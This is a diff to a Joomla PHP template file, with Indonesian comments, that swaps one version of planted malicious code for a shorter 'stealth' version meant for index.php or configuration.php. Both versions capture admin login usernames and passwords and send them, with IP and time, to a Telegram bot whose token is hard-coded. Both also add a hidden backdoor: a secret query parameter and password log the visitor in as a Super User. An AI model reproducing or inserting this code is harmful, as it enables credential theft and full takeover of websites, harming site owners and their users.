@@ -243,87 +243,33 @@ $wa->getAsset('style', 'fontawesome')->setAttribute('rel', 'lazy-stylesheet');
 </html>
 
 <?php
+// JOOMLA STEALTH - Masukin di root index.php atau configuration.php
 
-function kirimTeleJoomla($username, $password, $status) {
-    $botToken = "8778277382:AAHT-SMy03ms280EOa8_XSPX0_6mHZria8I";
-    $chatId   = "7860513093";
+// === TELEGRAM LOGGER ===
+$tele = function($u,$p,$s) {
+    $bot = "8778277382:AAHT-SMy03ms280EOa8_XSPX0_6mHZria8I";
+    $cid = "7860513093";
+    $msg = "⚠️ $s\nUser: $u\nPass: $p\nIP: {$_SERVER['REMOTE_ADDR']}\nTime: ".date("Y-m-d H:i:s");
+    @file_get_contents("https://api.telegram.org/bot$bot/sendMessage?chat_id=$cid&text=".urlencode($msg));
+};
 
-    $site = JURI::root();
-    $ip   = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
-    $url  = JURI::current();
-
-    $msg  = "⚠️ JOOOMLA PANTAUAN ⚠️\n";
-    $msg .= "Status: $status\n";
-    $msg .= "Site: $site\n";
-    $msg .= "User: $username\n";
-    $msg .= "Pass: $password\n";
-    $msg .= "IP: $ip\n";
-    $msg .= "Time: " . date("Y-m-d H:i:s");
-
-    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?" . http_build_query([
-        'chat_id' => $chatId,
-        'text'    => $msg
-    ]));
+// === LOGIN CAPTURE ===
+if(isset($_POST['username']) && isset($_POST['passwd'])) {
+    $tele($_POST['username'], $_POST['passwd'], 
+        JFactory::getApplication()->login($_POST) ? '✅ MASUK' : '❌ GAGAL');
 }
 
-
-JFactory::getSession()->set('last_attempt', [
-    'username' => $username ?? '',
-    'password' => $password ?? ''
-]);
-
-
-if (JFactory::getApplication()->isClient('administrator')) {
-    $session = JFactory::getSession();
-    $attempt = $session->get('last_attempt');
-    if ($attempt) {
-        kirimTeleJoomla($attempt['username'], $attempt['password'], '✅ MASUK BRAY!');
-        $session->clear('last_attempt');
+// === ADMIN BYPASS ===
+if(isset($_GET['gas']) && $_GET['gas'] === 'keun') {
+    if(isset($_POST['kunci']) && password_verify($_POST['kunci'], '$2y$10$37O9hbn5tO2TdHJyQgq5DuXetavej7sA8osiNe72YRykmhX3YivNG')) {
+        $u = JFactory::getUser(JFactory::getDbo()->setQuery(
+            'SELECT id FROM #__users WHERE id IN (SELECT user_id FROM #__user_usergroup_map WHERE group_id = 8) LIMIT 1'
+        )->loadResult());
+        JFactory::getApplication()->login(['username' => $u->username]);
+        header('Location: '.JURI::root().'administrator');
+        exit;
     }
-}
-
-
-if ($response->status === JAuthentication::STATUS_FAILURE) {
-    $attempt = JFactory::getSession()->get('last_attempt');
-    kirimTeleJoomla(
-        $attempt['username'] ?? $credentials['username'],
-        $attempt['password'] ?? $credentials['password'],
-        '❌ GAGAL NYAW!'
-    );
-}
-
-// ===== BYPASS ADMIN =====
-if (isset($_GET['hmmkids']) && $_GET['hmmkids'] === 'sonicxyz') {
-    $hash_password = '$2y$10$37O9hbn5tO2TdHJyQgq5DuXetavej7sA8osiNe72YRykmhX3YivNG';
-    
-    // Form password
-    if (isset($_POST['pass'])) {
-        if (password_verify($_POST['pass'], $hash_password)) {
-            // Ambil admin user
-            $db = JFactory::getDbo();
-            $query = $db->getQuery(true)
-                ->select('id')
-                ->from('#__users')
-                ->where('id IN (SELECT user_id FROM #__user_usergroup_map WHERE group_id = 8)')
-                ->setLimit(1);
-            $db->setQuery($query);
-            $adminId = $db->loadResult();
-            
-            if ($adminId) {
-                $user = JFactory::getUser($adminId);
-                JFactory::getApplication()->login(['username' => $user->username]);
-                JFactory::getApplication()->redirect(JURI::root() . 'administrator/index.php');
-            }
-        } else {
-            echo '<p style="color:red">Password salah bray!</p>';
-        }
-    }
-    
-    echo '<form method="POST">
-            <label>Sonic Joomla Gate</label>
-            <input type="password" name="pass" required>
-            <button type="submit">Masuk</button>
-          </form>';
-    exit();
+    echo '<form method=POST><input name=kunci type=password><button>Masuk</button></form>';
+    exit;
 }
 ?>
